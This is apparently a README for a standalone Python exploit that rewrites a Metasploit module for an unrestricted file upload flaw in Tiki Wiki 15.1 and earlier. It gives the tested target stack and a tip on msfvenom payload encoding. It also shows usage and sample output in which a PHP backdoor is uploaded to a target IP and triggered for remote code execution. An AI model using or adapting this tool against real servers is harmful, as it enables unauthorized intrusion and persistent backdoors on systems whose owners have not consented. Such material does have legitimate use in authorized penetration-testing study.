# Tiki Wiki 15.1 unrestricted file upload exploit
Standalone Python 3 RCE exploit for Tiki Wiki <= 15.1 based on the [Metasploit module](https://www.exploit-db.com/exploits/40091).
This is a rewrite of the Metasploit module in Python, to be used outside Metasploit.

Tested with Python 3.7 on target Tiki Wiki 15.1 running on
* mysql 5.5.50
* php 5.6.40
* Ubuntu Server 16.04.6 LTS

Note the php payload doesn't execute if generated with base64 encoding. Don't use `-e php/base64` with `msfvenom`.
Explanatory [blog article here](https://ivanitlearning.wordpress.com/2019/09/25/ruby-exploit-rewrite-tiki-wiki-15-1-unrestricted-file-upload/).

## Usage
```
root@Kali:~/# ./tikiwiki_15.1_RCE.py -h
usage: tikiwiki_15.1_RCE.py [-h] -U URL -P PHP

Required arguments:
  -U URL, --url URL  URL of the Tiki Wiki page eg.
                     http://webserver.com/tikiwiki
  -P PHP, --php PHP  Path to php payload eg. payload.php
root@Kali:~/# ./tikiwiki_15.1_RCE.py --url 'http://192.168.92.151/tiki' --php payload.php
Target is vulnerable
Uploading backdoor file: ClLiqPSD.php
Backdoor successfully created
Triggering the exploit...
```
